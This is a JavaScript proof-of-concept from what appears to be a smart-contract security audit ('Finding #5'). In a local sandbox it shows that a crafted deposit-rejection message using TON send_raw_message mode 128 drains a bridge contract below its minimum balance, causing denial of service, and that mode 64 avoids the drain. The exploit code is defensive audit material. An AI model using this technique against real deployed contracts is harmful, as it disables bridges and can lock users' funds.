// PoC for Finding #5: TON Bridge Mode 128 Griefing/DoS
// Uses @ton-community/sandbox

const { Blockchain } = require('@ton-community/sandbox');
const { beginCell, Cell, contractAddress, Address, toNano } = require('ton-core');
const { compileFunc } = require('@ton-community/func-js');
const fs = require('fs');
const path = require('path');

const MIN_BALANCE = 5_000_000_000n; // 5 TON
const INITIAL_TON = toNano('50'); // 50 TON

async function compileContract() {
    const contractDir = path.resolve(__dirname, '..', 'contracts');
    const contractPath = path.join(contractDir, 'min_bridge.fc');
    
    const source = fs.readFileSync(contractPath, 'utf8');

    const compileResult = await compileFunc({
        targets: [contractPath],
        sources: {
            [contractPath]: source
        }
    });

    if (compileResult.status !== 'ok') {
        throw new Error('Compilation failed: ' + compileResult.message);
    }

    return Cell.fromBase64(compileResult.codeBoc);
}

async function getContractBalance(bc, addr) {
    const c = await bc.getContract(addr);
    return c.balance;
}

async function deployContract(bc, codeCell, dataCell, balance) {
    const initState = { code: codeCell, data: dataCell };
    const addr = contractAddress(0, initState);
    
    // Use createShardAccount format (from SmartContract.js source)
    const shardAccount = {
        account: {
            addr: addr,
            storage: {
                lastTransLt: 0n,
                balance: { coins: balance },
                state: {
                    type: 'active',
                    state: {
                        code: codeCell,
                        data: dataCell
                    }
                }
            },
            storageStats: {
                used: { cells: 0n, bits: 0n, publicCells: 0n },
                lastPaid: 0,
                duePayment: null
            }
        },
        lastTransactionLt: 0n,
        lastTransactionHash: 0n  // Must be BigInt 0n, NOT Buffer!
    };
    
    await bc.setShardAccount(addr, shardAccount);
    
    return { addr, initState };
}

async function sendInternalMessage(bc, src, dest, value, body) {
    return await bc.sendMessage({
        info: {
            type: 'internal',
            ihrDisabled: true,
            bounce: true,
            bounced: false,
            src: src,
            dest: dest,
            value: { coins: value },
            ihrFee: 0n,
            forwardFee: 0n,
            createdLt: 0n,
            createdAt: 0
        },
        init: undefined,
        body: body,
    });
}

async function main() {
    console.log('=== TON Bridge Mode 128 Griefing PoC ===');
    console.log('(Finding #5: TON Bridge Mode 128 Griefing/DoS)\n');

    // Step 1: Compile the contract
    console.log('Step 1: Compiling contract...');
    const codeCell = await compileContract();
    const dataCell = beginCell().endCell();
    console.log('Contract compiled successfully\n');

    // Step 2: Create blockchain
    console.log('Step 2: Creating blockchain...');
    const blockchain = await Blockchain.create();
    const deployer = await blockchain.treasury('deployer');
    console.log('Blockchain ready\n');

    // ============================================================
    // TEST VULNERABLE (MODE 128)
    // ============================================================
    console.log('--- VULNERABLE TEST (mode 128) ---\n');

    const { addr: addrVuln } = await deployContract(
        blockchain, codeCell, dataCell, INITIAL_TON
    );
    console.log(`Contract address: ${addrVuln}\n`);

    let bal = await getContractBalance(blockchain, addrVuln);
    console.log(`Initial balance: ${Number(bal) / 1e9} TON\n`);

    // Send attack: op=1 with mode 128
    console.log('Sending deposit rejection (op=1, mode 128 attack)...\n');
    const vulnBody = beginCell()
        .storeUint(1, 32)          // op = 1: deposit reject
        .storeCoins(toNano('10'))   // 10 TON worth
        .storeRef(beginCell()
            .storeUint(0, 160)
        .endCell())
        .endCell();

    await sendInternalMessage(
        blockchain, deployer.address, addrVuln,
        toNano('1'), vulnBody
    );

    bal = await getContractBalance(blockchain, addrVuln);
    const balTON = Number(bal) / 1e9;
    const isBelow = bal < MIN_BALANCE;

    console.log(`Balance after mode 128 attack: ${balTON.toFixed(6)} TON`);
    console.log(`Below ${Number(MIN_BALANCE) / 1e9} TON minimum? ${isBelow ? 'YES ❌' : 'NO ✅'}`);
    console.log(`DoS achieved? ${isBelow ? 'YES - BRIDGE DISABLED! ❌❌❌' : 'NO ✅'}\n`);

    // ============================================================
    // TEST FIXED (MODE 64)
    // ============================================================
    console.log('--- FIXED TEST (mode 64) ---\n');

    // Use different data to get different address
    const dataCell64 = beginCell().storeUint(1, 1).endCell();
    const { addr: addrFixed } = await deployContract(
        blockchain, codeCell, dataCell64, INITIAL_TON
    );
    console.log(`Fixed contract address: ${addrFixed}\n`);

    let bal64 = await getContractBalance(blockchain, addrFixed);
    console.log(`Fixed contract funded: ${Number(bal64) / 1e9} TON\n`);

    // Send fixed mode (op=3 = mode 64 safe)
    const fixedBody = beginCell()
        .storeUint(3, 32)          // op = 3: fixed mode 64
        .storeRef(beginCell()
            .storeUint(0, 160)
        .endCell())
        .endCell();

    await sendInternalMessage(
        blockchain, deployer.address, addrFixed,
        toNano('1'), fixedBody
    );

    bal64 = await getContractBalance(blockchain, addrFixed);
    const bal64TON = Number(bal64) / 1e9;
    const preserved = bal64 > MIN_BALANCE;

    console.log(`Balance after mode 64: ${bal64TON.toFixed(6)} TON`);
    console.log(`Balance preserved (> ${Number(MIN_BALANCE) / 1e9} TON)? ${preserved ? 'YES ✅' : 'NO ❌'}\n`);

    // RESULTS
    console.log('========================================');
    console.log('RESULTS SUMMARY');
    console.log('========================================');
    console.log(`| Metric              | mode 128 (VULN)  | mode 64 (FIXED)  |`);
    console.log(`|---------------------|------------------|-------------------|`);
    console.log(`| Initial             | 50.000000 TON    | 50.000000 TON     |`);
    console.log(`| Final               | ${balTON.toFixed(6).padStart(11)} TON    | ${bal64TON.toFixed(6).padStart(11)} TON   |`);
    console.log(`| Below min (5 TON)?  | ${(isBelow ? 'YES ❌' : 'NO ✅').padEnd(16)}| ${(!preserved ? 'YES ❌' : 'NO ✅').padEnd(17)}|`);
    console.log(`| DoS possible?       | ${(isBelow ? 'YES ❌' : 'NO ✅').padEnd(16)}| ${(!preserved ? 'YES ❌' : 'NO ✅').padEnd(17)}|`);
    console.log('========================================\n');

    if (isBelow) {
        console.log('❌❌❌ VULNERABILITY CONFIRMED!');
        console.log('   mode 128 in send_raw_message drains entire contract balance.');
        console.log('   One rejected deposit disables the TON bridge.\n');
    } else {
        console.log('⚠️  mode 128 did not drain below minimum.\n');
    }

    if (preserved) {
        console.log('✅ Fix confirmed: mode 64 preserves contract balance.\n');
    } else {
        console.log('⚠️  mode 64 also drained (unexpected).\n');
    }

    console.log('\n--- CONCLUSION ---');
    if (isBelow) {
        console.log('Vulnerability #5: CONFIRMED - TON Bridge susceptible to Griefing via mode 128');
    } else {
        console.log('Vulnerability #5: NOT CONFIRMED via this test');
    }
    if (preserved) {
        console.log('Fix (mode 64): WORKS CORRECTLY - balance preserved');
    }

    process.exit(0);
}

main().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
